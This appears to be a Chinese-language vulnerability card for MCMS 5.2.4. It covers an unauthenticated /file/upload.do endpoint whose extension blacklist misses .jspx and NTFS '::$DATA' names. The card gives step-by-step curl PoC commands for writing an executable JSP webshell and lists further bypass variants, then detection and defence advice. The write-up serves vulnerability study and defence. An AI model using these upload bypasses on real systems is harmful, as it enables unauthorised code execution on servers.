---
id: web-java-component-mcms-fileaction-upload-blacklist-jspx-ads
title: MCMS 5.2.4 FileAction 未授权上传：黑名单仅 .exe/.jsp，jspx 与 Windows NTFS ADS ::$DATA 绕过写 WebShell
type: scenario
domain: web
path: web/java/component
technique: file-upload-blacklist-jspx-ntfs-ads-bypass
aliases:
- MCMS 任意文件上传
- MingSoft CMS 上传
- /file/upload.do
- jspx 绕过
- NTFS ADS ::$DATA
- 黑名单上传绕过
tags:
- web
- java
- mcms
- mingsoft
- file-upload
- webshell
- jspx
- ntfs-ads
- blacklist-bypass
cve: []
severity: high
confidence: high
affected_versions: MCMS（MingSoft CMS）5.2.4（原文审计版本；其他版本未验证）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V223
  verified_at: '2026-11-07T06:47:36+08:00'
  notes: 已对照原文61张图逐张核对：图16-25 /file/upload.do 上传流程、errorType {.exe,.jsp}、substring(lastIndexOf)取后缀、realPath=webapp/upload；图26-28 zcc.jspx 上传成功响应 /upload/1/appLogo/16728213901.jspx；图29-31 zcc.jsp::$DATA 上传响应 /upload/1/appLogo/1672885346849.jsp::$DATA 且磁盘生成 1672885346849.jsp（JSP源文件），与卡一致。已修正原文误写：isRename=true 时文件名被重命名为时间戳，非固定 zcc.jsp；若 isRename=false 才落盘 zcc.jsp。未验证点：PoC未本机复跑；frontmatter无 sources/source_url；affected_versions按原文审计版本MCMS 5.2.4标注。
---

## 一句话结论

MCMS 的 `FileAction` 映射在 `/file` 上且未纳入 `/ms` 鉴权前缀，`/file/upload.do` 可未授权上传；上传只按文件名最后一个 `.` 取后缀并与黑名单 `.exe,.jsp` 做 `equalsIgnoreCase` 比较，因此传 `.jspx`（Tomcat 默认映射到 JspServlet）或在 Windows 上传 `zcc.jsp::$DATA`（NTFS 默认数据流，后缀比对变成 `.jsp::$DATA` 而落盘仍是 `.jsp`）即可绕过并写入可执行 WebShell。

## 原理

- **未授权入口**：`FileAction` 标注 `@Controller` + `@RequestMapping("/file")`，没有 `ms.manager.path` 前缀，因此 `/file/upload.do` 不经过 `/ms/**` 的登录/权限过滤器。
- **上传路径**：请求参数 `uploadPath`、`isRename`、`appId`、`file`；`checkUploadPath` 只拒绝包含 `../`、`..\\` 的路径；`appId=true` 时在 `uploadPath` 前拼应用 ID。
- **后缀提取**：`fileType = fileName.substring(fileName.lastIndexOf("."))`，随后 `for (errorType : uploadFileDenied.split(",")) if (fileType.equalsIgnoreCase(errorType)) error`。默认黑名单是 `.exe,.jsp`，没有 `.jspx`、`.jspf`、`.html` 等。
- **jspx 可执行**：Tomcat 默认 `web.xml` 把 `*.jsp` 和 `*.jspx` 都交给 JspServlet；JSPX 是 XML 语法的 JSP，上传后直接请求即可执行。
- **NTFS ADS 绕过**：Windows 文件名 `zcc.jsp::$DATA` 中的 `::$DATA` 表示“默认数据流”；代码取到的后缀是 `.jsp::$DATA`，与 `.jsp` 不相等，黑名单放行；文件系统保存后实际文件名是 `zcc.jsp`（ADS 默认流），因此仍是可执行的 JSP。
- **落盘位置**：`realPath`（默认 upload 目录） + `uploadPath` + 文件名，最终响应返回 `/upload/<appId>/<uploadPath>/<随机名>`，位于 Web 可访问目录。

## 触发条件

- MCMS 5.2.4 默认配置，`ms.upload.enable-web` 为 true。
- 目标运行在 Tomcat/JSP 容器且未禁用 `*.jspx` 映射（jspx 方式）；或目标为 Windows NTFS（ADS 方式）。
- 无需登录即可访问 `/file/upload.do`（无 `/ms` 前缀）。

## 利用步骤

1. 直接向 `/file/upload.do` 发 multipart 请求，`uploadPath=/appLogo`、`isRename=true`、`appId=true`，文件名为 `zcc.jspx`，内容为 JSPX 语法的 JSP。
2. 读取响应 JSON 的 `data` 字段，得到 `/upload/1/appLogo/<timestamp>.jspx`。
3. 浏览器/curl 访问该路径，JSPX 被 JspServlet 编译执行。
4. Windows 目标可改用文件名 `zcc.jsp::$DATA`：`isRename=true` 时服务端会按时间戳重命名，原文响应为 `.../1672885346849.jsp::$DATA`，磁盘上实际生成 `1672885346849.jsp`（原文磁盘确认该文件为 JSP 源文件）；若 `isRename=false` 则保留原名，落盘 `zcc.jsp`。访问对应 `.jsp` 执行。
5. 同项目后台 `/ms/file/uploadTemplate.do` 使用同一套后缀黑名单，登录后也可用 jspx/ADS 写入模板目录；`4.html` 这类 HTML 可直接造成存储型 XSS。

## PoC

```bash
# jspx 绕过（Linux/Windows 均可，取决于容器是否映射 *.jspx）
curl -s -X POST 'http://target:8081/file/upload.do' \
  -F 'uploadPath=/appLogo' \
  -F 'isRename=true' \
  -F 'appId=true' \
  -F 'file=@shell.jspx;filename=zcc.jspx;type=image/jpeg'

# 响应示例：{"result":true,"code":200,"data":"/upload/1/appLogo/16728213901.jspx"}
curl -s 'http://target:8081/upload/1/appLogo/16728213901.jspx'

# Windows NTFS ADS 绕过（isRename=true 时响应 data 为 /upload/1/appLogo/<timestamp>.jsp::$DATA，磁盘生成 <timestamp>.jsp）
curl -s -X POST 'http://target:8081/file/upload.do' \
  -F 'uploadPath=/appLogo' \
  -F 'isRename=true' \
  -F 'appId=true' \
  -F 'file=@shell.jsp;filename=zcc.jsp::$DATA;type=image/jpeg'
# 若改 isRename=false 则保留原名，磁盘生成 zcc.jsp；访问 /upload/1/appLogo/zcc.jsp
```

JSPX 最小内容示例（XML 语法）：

```xml
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
  <jsp:scriptlet>out.println("ok");</jsp:scriptlet>
</jsp:root>
```

说明：原文在 Windows 环境实测 jspx 与 `::$DATA` 两种方式均上传成功，并从磁盘目录确认 `1672885346849.jsp` 为 JSP 源文件；未在本机复跑。

## 变体与关联

- **后缀黑名单其他绕过**：`.jspx`、`.jspf`、`.jsp.`（Windows 去尾点）、`.jsp%00`（旧容器）、大小写/多后缀；核心是黑名单只覆盖 `.exe` 和 `.jsp`。
- **路径穿越**：`checkUploadPath` 只查 `../`/`..\\`，若结合其他编码/多重解码可能绕过；本例未涉及。
- **关联**：[[web-java-component-mcms-dual-route-prefix-auth-bypass]]（未授权根因）、[[web-java-component-mcms-template-unzip-zipslip]]（同项目 Zip Slip）、[[web-generic-file-upload-zip-slip-webshell-write]]（通用 Zip Slip 手法）。

## 检测与防御

- **检测**：`/file/upload.do` 未授权可达；上传文件名后缀为 `.jspx` 或包含 `::$DATA`；Web 目录出现新 JSP/JSPX 文件。
- **防御**：扩展名白名单并统一小写、拒绝 ADS/冒号与多点后缀、上传后重命名且存到 Web 根之外；关闭 `*.jspx` 映射或限制上传目录不可执行；把 `/file/**` 纳入认证与权限校验。
